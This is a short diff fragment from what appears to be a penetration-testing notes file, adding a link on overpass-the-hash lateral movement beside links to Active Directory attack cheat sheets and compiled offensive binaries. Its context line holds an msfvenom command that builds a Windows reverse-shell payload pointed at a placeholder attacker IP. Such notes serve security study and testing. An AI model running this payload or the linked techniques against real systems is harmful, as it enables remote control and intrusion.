@@ -627,3 +627,5 @@ Command: msfvenom -p windows/shell_reverse_tcp LHOST={attacker ip} LPORT={port} 
 [AD cheat sheet #2](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Active%20Directory%20Attack.md)
 
 [Compiled binaries](https://github.com/r3motecontrol/Ghostpack-CompiledBinaries)
+
+[Overpass the hash](https://www.hackingarticles.in/lateral-movement-over-pass-the-hash/)
